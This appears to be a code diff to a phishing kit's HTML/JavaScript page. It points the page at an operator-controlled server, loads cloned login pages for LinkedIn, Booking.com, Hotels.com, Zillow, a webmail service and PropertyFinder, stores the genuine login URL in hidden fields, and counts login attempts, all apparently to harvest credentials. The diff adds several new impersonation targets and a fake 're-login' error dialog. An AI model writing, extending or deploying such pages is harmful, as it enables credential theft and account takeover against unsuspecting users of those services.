@@ -15,15 +15,15 @@
       href="original-favicon.ico"
       type="image/x-icon"
     />
-     <base href="https://stareio.com/SOMDserver/assets/" />
-    <!-- <base href="http://tools.com/pages/latestpages/SOMDserver/assets/" /> -->
+    <!-- <base href="https://stareio.com/SOMDserver/assets/" /> -->
+    <base href="http://tools.com/pages/latestpages/SOMDserver/assets/" />
 
     <!-- <script src="./myjs.js"></script> -->
     <script>
-      // const BASE_URL = "http://tools.com/pages/latestpages/SOMDserver";
-      // const ASSETS_URL = "http://tools.com/pages/latestpages/SOMDserver/assets";
-      const BASE_URL = "https://stareio.com/SOMDserver";
-      const ASSETS_URL = "https://stareio.com/SOMDserver/assets";
+      const BASE_URL = "http://tools.com/pages/latestpages/SOMDserver";
+      const ASSETS_URL = "http://tools.com/pages/latestpages/SOMDserver/assets";
+      // const BASE_URL = "https://stareio.com/SOMDserver";
+      // const ASSETS_URL = "https://stareio.com/SOMDserver/assets";
 
       async function getPageContent(url, original) {
         fetch(`${BASE_URL}/${url}.html`)
@@ -45,7 +45,7 @@
             document.querySelector("#fuc").value =
               document.querySelector("#foc").value;
             document.querySelector("#orgi").value = original;
-          document.querySelector("#page").value = page;
+            document.querySelector("#page").value = page;
           })
           .catch((error) => {
             console.error("Error Loading data:", error);
@@ -57,9 +57,29 @@
           if (ss == "lkkd") {
             page = "lkkd";
             original = "https://www.linkedin.com/login";
+          } else if (ss == "lkkd-en") {
+            page = "lkkd-en";
+            original = "https://www.linkedin.com/login";
+          } else if (ss == "boook") {
+            page = "boook";
+            original = "https://account.booking.com/sign-in";
+          } else if (ss == "hots") {
+            page = "hots";
+            original = "https://www.hotels.com/login";
           } else if (ss == "zill") {
             page = "zill";
-            original = "https://www.zillow.com/auth/user/login?login_mode=redirect&entry_point=topnav";
+            original =
+              "https://www.zillow.com/auth/user/login?login_mode=redirect&entry_point=topnav";
+          } else if (ss == "mail2000") {
+            page = "mail2000";
+            original = "http://webmail.pbf.com.tw/cgi-bin/start?wrap=1";
+          } else if (ss == "pexpert") {
+            page = "pexpert";
+            original = "https://app.propertyfinder.ae/user-profile";
+          } else if (ss == "micn") {
+          } else if (ss == "pfinder") {
+            page = "pfinder";
+            original = "https://www.propertyfinder.ae/";
           } else if (ss == "micn") {
             page = "micn";
             original = "";
@@ -71,7 +91,6 @@
 
           await getPageContent(page, original);
           displayPage(page);
-         
         } catch (e) {
           console.log("ABS Func", e);
         }
@@ -80,14 +99,20 @@
       function displayPage(page) {
         if (
           page == "lkkd" ||
+          page == "lkkd-en" ||
           page == "zill" ||
-          page == "micn" 
+          page == "boook" ||
+          page == "hots" ||
+          page == "mail2000" ||
+          page == "pexpert" ||
+          page == "pfinder" ||
+          page == "micn"
         ) {
-          console.log('Page', page);
+          console.log("Page", page);
         } else {
           document.querySelector(".frr_popup").style.display = "flex";
 
-            document.querySelector("#test #errorPop").innerHTML = `<style>
+          document.querySelector("#test #errorPop").innerHTML = `<style>
 
             .err_dialog {
                 width: 450px;
@@ -169,7 +194,6 @@
                     <button class="err_login-button" onclick="showForm('default')"">重新登录</button>
                 </div>
             </div>`;
-          
         }
       }
     </script>
@@ -547,7 +571,7 @@
 
       let nbg = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;
 
-      
+      // sessionStorage.clear();
 
       let trialCount = sessionStorage.getItem("num_trial");
 
